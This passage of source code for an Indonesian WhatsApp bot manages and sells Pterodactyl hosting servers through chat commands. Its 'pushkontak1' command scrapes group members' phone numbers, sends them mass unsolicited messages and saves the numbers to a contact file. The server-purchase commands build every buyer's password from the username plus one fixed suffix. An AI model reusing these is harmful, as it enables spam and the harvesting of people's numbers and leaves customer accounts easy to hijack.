}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND*')
reply('*REINSTALLING THE SERVER..*')
}
break


case 'linklogin2': case 'linklog2':{
let teksmenu = `${domain2}`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender] 
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksmenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: "*Click Button Di Bawah👇*"
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Login\",\"url\":\"${domain2}\",\"merchant_url\":\"https://www.google.com\"}`
}]
}) 
})} 
}}, {userJid: m.sender, quoted: qpayment}) 
await tamzz.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break


case 'minsaldo':
if (!isOwner) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`)
if (!q.split(",")[0]) return reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
if (!q.split(",")[1]) return reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
if (cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo) < q.split(",")[1] && cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo) !== 0) return m.reply(`Dia saldonya ${cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo)}, jadi isPremium melebihi ${cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo)} yah`)
minSaldo(q.split(",")[0]+"@s.whatsapp.net", Number(q.split(",")[1]), db_saldo)
reply(`*USER SALDO*
 • ID : ${q.split(",")[0]}
 • Nomor : ${q.split(",")[0]}
 • Tanggal : ${hariini}
 • Saldo : Rp${toRupiah(cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo))}, `)
break


case "listsrv": {
  if (!isOwner) return reply(`Maaf, Anda tidak dapat melihat daftar server.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/servers?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let servers = res.data;
  let sections = [];
  
  for (let server of servers) {
    let s = server.attributes;
    
    let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
      "method": "GET",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + capikey
      }
    });
    
    let data = await f3.json();
    var status = data.attributes ? data.attributes.current_state : s.status;  
  
  }
  
  tamzz.sendList(m.chat, `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}`, "Powered By MikkuBot", {
                    title: `Total Server: ${res.meta.pagination.count}`, sections: [{
                        title: "List Servers Panel",
                        rows: servers.map(a => ({
                                title: `ID: ${a.attributes.id} - Status: ${status}`,
                                description: a.attributes.name,
                                id: `.detsrv ${a.attributes.id}`
                        }))
                    }]
                })
                
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;


case "listsrv2": {
  if (!isOwner) return reply(`Maaf, Anda tidak dapat melihat daftar server.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain2 + "/api/application/servers?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey2
    }
  });
  let res = await f.json();
  let servers = res.data;
  let sections = [];
  
  for (let server of servers) {
    let s = server.attributes;
    
    let f3 = await fetch(domain2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
      "method": "GET",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + capikey2
      }
    });
    
    let data = await f3.json();
    var status = data.attributes ? data.attributes.current_state : s.status;  
  
  }
  
  tamzz.sendList(m.chat, `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}`, "Powered By MikkuBot", {
                    title: `Total Server: ${res.meta.pagination.count}`, sections: [{
                        title: "List Servers Panel",
                        rows: servers.map(a => ({
                                title: `ID: ${a.attributes.id} - Status: ${status}`,
                                description: a.attributes.name,
                                id: `.detsrv ${a.attributes.id}`
                        }))
                    }]
                })
                
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;


case 'delchat': case 'del': case 'delete':{
if (!isOwner) return m.reply('*khusus ϝαԃȥʋρɳ🤪*')
tamzz.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: true,
id: m.quoted.id,
participant: m.quoted.sender
}
})
}
break


case 'getcase': {
const getCase = (cases) => {

            return "case "+`'${cases}'`+fs.readFileSync("./MikkuBot.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"

        }
            try{

                if (!isOwner) return reply('ngapain')

                if (!text) return reply(`contoh : ${prefix + command} antilink`)

                let nana = await getCase(q)

                reply(nana)

            } catch(err){

            console.log(err)

            reply(`Case ${text} tidak di temukan`)

        }
}
        break 
        
        
case 'git': case 'gitclone':
if (!args[0]) return m.reply(`Where is the link?\nExample :\n${prefix}${command} https://github.com/pler/lodon`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return m.reply(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
   tamzz.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: qpayment }).catch((err) => m.reply(mess.error))
reply ("*WAIT PROSES TUAN KU ⏱️*")  
break

case 'enc': {
            if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
            if (!q) return reply(`Contoh ${prefix+command} const adrian = require('adrian-api')`)
            let meg = await tamzz.sendMessage
            reply(`${meg.result}`)
        }
        break
        
        
case "delsrv": {
      if (!isOwner) return reply(`KHUSUS OWNER`)

let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND❌*')
reply('*SUCCESSFULLY DELETE THE SERVER✅*')
}
        break
        
        
case "delusr": {
  if (!isOwner) return reply(`KHUSUS OWNER🤪`)
let usr = args[0]
if (!usr) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*USER NOT FOUND❌*')
reply('*SUCCESSFULLY DELETE THE USER✅*')
}
        break
        
        
case "owner": {
const repf = await tamzz.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Kontak`, 
contacts: list }, contextInfo: {
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid: [sender]
}}, { quoted: qpayment })
tamzz.sendMessage(from, { text : `Hai Onii Chan @${sender.split("@")[0]}, Nih Owner Kuh`, contextInfo:{
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid:[sender]
}}, { quoted: repf })
}
break


case 'listcase': {
let { listCase } = require('./all/scrapelistCase.js')
reply(listCase())
}
break


case 'totag': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(`Ehh Bot Nya Belum Jadi Admin ☝️😅`)
if (!isAdmins) return reply(mess.only.admin)
if (!m.quoted) return `Reply pesan dengan caption ${prefix + command}`
tamzz.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
}
break


case 'liston': {
if (!m.isGroup) return reply(mess.only.group)
let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
let online = [...Object.keys(store.presences[id]), botNumber]
tamzz.sendText(m.chat, '乂 *LIST ONLINE:*\n\n' + online.map(v => '◦ @' + v.replace(/@.+/, '')).join`\n`, m, {
mentions: online
})
}
break


case "sindy":{
if (!text) return m.reply(`*• Example:* ${prefix + command} halo`);
try {
let gpt = await (
await fetch(`https://itzpire.site/ai/botika?q=${text}&user=${m.sender}&model=sindy`)
).json();
 m.reply(gpt.result);
} catch (e) {
return m.reply("`*Gpt Not Responded Onii-Chan*`");
}}
break;


case "listgc": case "cekid": case"listgrup": {
let gcall = Object.values(await tamzz.groupFetchAllParticipating().catch(_=> null))
let listgc = `*｢ LIST ALL CHAT GRUP ｣*\n\n`
await gcall.forEach((u, i) => {
listgc += `*• Nama :* ${u.subject}\n*• ID :* ${u.id}\n*• Total Member :* ${u.participants.length} Member\n*• Status Grup :* ${u.announce == true ? "Tertutup" : "Terbuka"}\n*• Pembuat :* ${u.owner ? u.owner.split('@')[0] : 'Sudah keluar'}\n\n`
})
m.reply(listgc)
}
break


case "setteksjpm": {
if (!isOwner) return m.reply(mess.only.owner)
if (text || m.quoted) {
const newteks = m.quoted ? m.quoted.text : text
await fs.writeFileSync("./all/database/teksjpm.js", newteks.toString())
m.reply("Berhasil Mengganti Teks JPM ✅")
} else {
return m.reply("dengan reply/kirim teks\n\nUntuk melihat teks jpm saat ini ketik *.teksjpm*")
}}
break


case 'suspend2': {
    if (!isOwner) return reply(`Onii-chan, Sorry Lu Siapa Bjirr`);
    let srv = args[0];
    if (!srv) return reply('ID nya mana?');

    let f = await fetch(domain2 + "/api/application/servers/" + srv + "/suspend", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey2
        }
    });

    let res = f.ok ? { errors: null } : await f.json();
    if (res.errors) return reply('*SERVER NOT FOUND*');
    
    reply('*Onii-chan, BERHASIL SUSPEND..*');
}
break;
            
case 'suspend': {
    if (!isOwner) return reply(`Onii-chan, Sorry Lu Siapa Bjirr`);
    let srv = args[0];
    if (!srv) return reply('Onii-chan, ID-nya mana?');

    let f = await fetch(domain + "/api/application/servers/" + srv + "/suspend", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        }
    });

    let res = f.ok ? { errors: null } : await f.json();
    if (res.errors) return reply('*SERVER NOT FOUND*');
    
    reply('*Onii-chan, BERHASIL SUSPEND..*');
}
break;
            
            
case "pushkontak1": {
    if (!isOwner) return m.reply("Onii-chan, " + mess.only.owner);
    if (!text) return m.reply("Onii-chan, format: idgrup|pesannya\n\nKetik *.listgc* untuk melihat semua list id grup");
    if (!text.split("|")) return m.reply("Onii-chan, format: idgrup|pesannya\n\nKetik *.listgc* untuk melihat semua list id grup");
    
    var [idnya, teks] = text.split("|");
    var groupMetadataa;
    
    try {
        groupMetadataa = await tamzz.groupMetadata(`${idnya}`);
    } catch (e) {
        return m.reply("Onii-chan, *ID Grup* tidak valid!");
    }

    const participants = await groupMetadataa.participants;
    const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
    m.reply(`✨ Onii-chan, memproses mengirim pesan ke *${halls.length}* member grup ✨`);

    for (let mem of halls) {
        if (mem !== m.sender) {
            contacts.push(mem);
            await fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts));
            await tamzz.sendMessage(mem, { text: teks }, { quoted: qpayment });
            await sleep(global.delaypushkontak);
        }
    }

    try {
        const uniqueContacts = [...new Set(contacts)];
        const vcardContent = uniqueContacts.map((contact) => {
            const vcard = [
                "BEGIN:VCARD",
                "VERSION:3.0",
                `FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
                `TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
                "END:VCARD",
                "", 
            ].join("\n");
            return vcard;
        }).join("");

        fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8");
    } catch (err) {
        m.reply("Onii-chan, " + err.toString());
    } finally {
        if (m.chat !== m.sender) {
            await m.reply(`🎉 Onii-chan, berhasil mengirim pesan ke *${halls.length} member grup*, file kontak berhasil dikirim ke private chat 🎉`);
        }
        await tamzz.sendMessage(m.sender, {
            document: fs.readFileSync("./all/database/contacts.vcf"),
            fileName: "contacts.vcf",
            caption: "File kontak berhasil dibuat✅",
            mimetype: "text/vcard",
        }, { quoted: qpayment });

        contacts.splice(0, contacts.length);
        await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts));
        await fs.writeFileSync("./all/database/contacts.vcf", "");
    }
}
break;


case "buysrv2gb": {
    if (cekSaldo(sender, db_saldo) < 2000) {
        return reply(`Onii-chan, *Maaf Saldo Anda Kurang Dari 2.000*\n\nSilahkan Deposit Terlebih Dahulu`);
    }

    let t = text.split(',');
    if (t.length < 2) return m.reply(`*Format salah!*\nPenggunaan:\n${prefix + command} user,nomer`);

    let username = t[0];
    let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
    let name = username + "2GB";
    let egg = global.eggsnya;
    let loc = global.location;
    let memo = "2048"; // Memory
    let cpu = "60";    // CPU
    let disk = "2048"; // Disk
    let email = username + "@buyer.kira.id";
    let akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg"; 

    if (!u) return;

    let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {};
    let password = username + "dyf7dbso7";

    let f = await fetch(domain + "/api/application/users", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        },
        "body": JSON.stringify({
            "email": email,
            "username": username,
            "first_name": username,
            "last_name": username,
            "language": "en",
            "password": password
        })
    });

    let data = await f.json();
    if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
    
    let user = data.attributes;

    let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        }
    });

    m.reply(`✨ SUCCES CREATE USER ID: ${user.id}`);

    let ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
1. OWNER HANYA MENGIRIM DATA AKUN 1X 
2. JANGAN MENGSHARE AKUN PANEL ANDA 
3. NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5. JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`;

    tamzz.sendMessage(u, { image: { url: akunlo }, caption: ctf }, { quoted: tamzz.chat });

    let data2 = await f2.json();
    let startup_cmd = data2.attributes.startup;

    let f3 = await fetch(domain + "/api/application/servers", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey,
        },
        "body": JSON.stringify({
            "name": name,
            "description": "Buyer K I R A",
            "user": user.id,
            "egg": parseInt(egg),
            "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
            "startup": startup_cmd,
            "environment": {
                "INST": "npm",
                "USER_UPLOAD": "0",
                "AUTO_UPDATE": "0",
                "CMD_RUN": "npm start"
            },
            "limits": {
                "memory": memo,
                "swap": 0,
                "disk": disk,
                "io": 500,
                "cpu": cpu
            },
            "feature_limits": {
                "databases": 5,
                "backups": 5,
                "allocations": 1
            },
            deploy: {
                locations: [parseInt(loc)],
                dedicated_ip: false,
                port_range: [],
            },
        })
    });

    let res = await f3.json();
    if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2));

    let server = res.attributes;

    await m.reply(`
✨ *SUCCESSFULLY ADD USER + SERVER* ✨
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
`);

    minSaldo(sender, Number(2000), db_saldo);
}
break;



case "buysrv8gb": {
    if (cekSaldo(sender, db_saldo) < 8000) {
        return reply(`Onii-chan, *Maaf Saldo Anda Kurang Dari 8.000*\n\nSilahkan Deposit Terlebih Dahulu`);
    }

    let t = text.split(',');
    if (t.length < 2) return m.reply(`*Format salah!*\nPenggunaan:\n${prefix + command} user,nomer`);

    let username = t[0];
    let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
    let name = username + "8GB";
    let egg = global.eggsnya;
    let loc = global.location;
    let memo = "8192"; // Memory
    let cpu = "220";   // CPU
    let disk = "8192"; // Disk
    let email = username + "@buyer.kira.id";
    let akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg"; 

    if (!u) return;

    let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {};
    let password = username + "dyf7dbso7";

    let f = await fetch(domain + "/api/application/users", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        },
        "body": JSON.stringify({
            "email": email,
            "username": username,
            "first_name": username,
            "last_name": username,
            "language": "en",
            "password": password
        })
    });

    let data = await f.json();
    if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
    
    let user = data.attributes;

    let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        }
    });

    m.reply(`✨ SUCCES CREATE USER ID: ${user.id}`);

    let ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
1. OWNER HANYA MENGIRIM DATA AKUN 1X 
2. JANGAN MENGSHARE AKUN PANEL ANDA 
3. NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5. JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`;

    tamzz.sendMessage(u, { image: { url: akunlo }, caption: ctf }, { quoted: tamzz.chat });

    let data2 = await f2.json();
    let startup_cmd = data2.attributes.startup;

    let f3 = await fetch(domain + "/api/application/servers", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey,
        },
        "body": JSON.stringify({
            "name": name,
            "description": "Buyer K I R A",
            "user": user.id,
            "egg": parseInt(egg),
            "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
            "startup": startup_cmd,
            "environment": {
                "INST": "npm",
                "USER_UPLOAD": "0",
                "AUTO_UPDATE": "0",
                "CMD_RUN": "npm start"
            },
            "limits": {
                "memory": memo,
                "swap": 0,
                "disk": disk,
                "io": 500,
                "cpu": cpu
            },
            "feature_limits": {
                "databases": 5,
                "backups": 5,
                "allocations": 1
            },
            deploy: {
                locations: [parseInt(loc)],
                dedicated_ip: false,
                port_range: [],
            },
        })
    });

    let res = await f3.json();
    if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2));

    let server = res.attributes;

    await m.reply(`
✨ *SUCCESSFULLY ADD USER + SERVER* ✨
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
`);

    minSaldo(sender, Number(8000), db_saldo);
}
break;


case "buysrv3gb": {
    if (cekSaldo(sender, db_saldo) < 3000) {
        return reply(`Onii-chan, *Maaf Saldo Anda Kurang Dari 3.000*\n\nSilahkan Deposit Terlebih Dahulu`);
    }

    let t = text.split(',');
    if (t.length < 2) return m.reply(`*Format salah!*\nPenggunaan:\n${prefix + command} user,nomer`);

    let username = t[0];
    let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
    let name = username + "3GB";
    let egg = global.eggsnya;
    let loc = global.location;
    let memo = "3072"; // Memory
    let cpu = "80";    // CPU
    let disk = "3072"; // Disk
    let email = username + "@buyer.kira.id";
    let akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg"; 

    if (!u) return;

    let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {};
    let password = username + "dyf7dbso7";

    let f = await fetch(domain + "/api/application/users", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        },
        "body": JSON.stringify({
            "email": email,
            "username": username,
            "first_name": username,
            "last_name": username,
            "language": "en",
            "password": password
        })
    });

    let data = await f.json();
    if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
    
    let user = data.attributes;

    let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        }
    });

    m.reply(`✨ SUCCES CREATE USER ID: ${user.id}`);

    let ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
1. OWNER HANYA MENGIRIM DATA AKUN 1X 
2. JANGAN MENGSHARE AKUN PANEL ANDA 
3. NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5. JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`;

    tamzz.sendMessage(u, { image: { url: akunlo }, caption: ctf }, { quoted: tamzz.chat });

    let data2 = await f2.json();
    let startup_cmd = data2.attributes.startup;

    let f3 = await fetch(domain + "/api/application/servers", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey,
        },
        "body": JSON.stringify({
            "name": name,
            "description": "Buyer K I R A",
            "user": user.id,
            "egg": parseInt(egg),
            "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
            "startup": startup_cmd,
            "environment": {
                "INST": "npm",
                "USER_UPLOAD": "0",
                "AUTO_UPDATE": "0",
                "CMD_RUN": "npm start"
            },
            "limits": {
                "memory": memo,
                "swap": 0,
                "disk": disk,
                "io": 500,
                "cpu": cpu
            },
            "feature_limits": {
                "databases": 5,
                "backups": 5,
                "allocations": 1
            },
            deploy: {
                locations: [parseInt(loc)],
                dedicated_ip: false,
                port_range: [],
            },
        })
    });

    let res = await f3.json();
    if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2));

    let server = res.attributes;

    await m.reply(`
✨ *SUCCESSFULLY ADD USER + SERVER* ✨
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
`);

    minSaldo(sender, Number(3000), db_saldo);
}
break;


case "buysrv4gb": {
    if (cekSaldo(sender, db_saldo) < 4000) {
        return reply(`Onii-chan, *Maaf Saldo Anda Kurang Dari 4.000*\n\nSilahkan Deposit Terlebih Dahulu`);
    }

    let t = text.split(',');
    if (t.length < 2) return m.reply(`*Format salah!*\nPenggunaan:\n${prefix + command} user,nomer`);

    let username = t[0];
    let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
    let name = username + "4GB";
    let egg = global.eggsnya;
    let loc = global.location;
    let memo = "4048"; // Memory
    let cpu = "100";   // CPU
    let disk = "4000"; // Disk
    let email = username + "@buyer.kira.id";
    let akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg"; 

    if (!u) return;

    let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {};
    let password = username + "dyf7dbso7";

    let f = await fetch(domain + "/api/application/users", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        },
        "body": JSON.stringify({
            "email": email,
            "username": username,
            "first_name": username,
            "last_name": username,
            "language": "en",
            "password": password
        })
    });

    let data = await f.json();
    if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
    
    let user = data.attributes;

    let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        }
    });

    m.reply(`✨ SUCCES CREATE USER ID: ${user.id}`);

    let ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
1. OWNER HANYA MENGIRIM DATA AKUN 1X 
2. JANGAN MENGSHARE AKUN PANEL ANDA 
3. NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5. JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`;

    tamzz.sendMessage(u, { image: { url: akunlo }, caption: ctf }, { quoted: tamzz.chat });

    let data2 = await f2.json();
    let startup_cmd = data2.attributes.startup;

    let f3 = await fetch(domain + "/api/application/servers", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey,
        },
        "body": JSON.stringify({
            "name": name,
            "description": "Buyer K I R A",
            "user": user.id,
            "egg": parseInt(egg),
            "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
            "startup": startup_cmd,
            "environment": {
                "INST": "npm",
                "USER_UPLOAD": "0",
                "AUTO_UPDATE": "0",
                "CMD_RUN": "npm start"
            },
            "limits": {
                "memory": memo,
                "swap": 0,
                "disk": disk,
                "io": 500,
                "cpu": cpu
            },
            "feature_limits": {
                "databases": 5,
                "backups": 5,
                "allocations": 1
            },
            deploy: {
                locations: [parseInt(loc)],
                dedicated_ip: false,
                port_range: [],
            },
        })
    });

    let res = await f3.json();
    if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2));

    let server = res.attributes;

    await m.reply(`
✨ *SUCCESSFULLY ADD USER + SERVER* ✨
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
`);

    minSaldo(sender, Number(4000), db_saldo);
}
break;


case "buysrv5gb": {
    if (cekSaldo(sender, db_saldo) < 5000) {
        return reply(`Onii-chan, *Maaf Saldo Anda Kurang Dari 5.000*\n\nSilahkan Deposit Terlebih Dahulu`);
    }

    let t = text.split(',');
    if (t.length < 2) return m.reply(`*Format salah!*\nPenggunaan:\n${prefix + command} user,nomer`);

    let username = t[0];
    let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
    let name = username + "5GB";
    let egg = global.eggsnya;
    let loc = global.location;
    let memo = "5138"; // Memory
    let cpu = "140";   // CPU
    let disk = "5138"; // Disk
    let email = username + "@buyer.kira.id";
    let akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg"; 

    if (!u) return;

    let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {};
    let password = username + "dyf7dbso7";

    let f = await fetch(domain + "/api/application/users", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        },
        "body": JSON.stringify({
            "email": email,
            "username": username,
            "first_name": username,
            "last_name": username,
            "language": "en",
            "password": password
        })
    });

    let data = await f.json();
    if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
    
    let user = data.attributes;

    let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        }
    });

    m.reply(`✨ SUCCES CREATE USER ID: ${user.id}`);

    let ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
1. OWNER HANYA MENGIRIM DATA AKUN 1X 
2. JANGAN MENGSHARE AKUN PANEL ANDA 
3. NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5. JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`;

    tamzz.sendMessage(u, { image: { url: akunlo }, caption: ctf }, { quoted: tamzz.chat });

    let data2 = await f2.json();
    let startup_cmd = data2.attributes.startup;

    let f3 = await fetch(domain + "/api/application/servers", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey,
        },
        "body": JSON.stringify({
            "name": name,
            "description": "Buyer K I R A",
            "user": user.id,
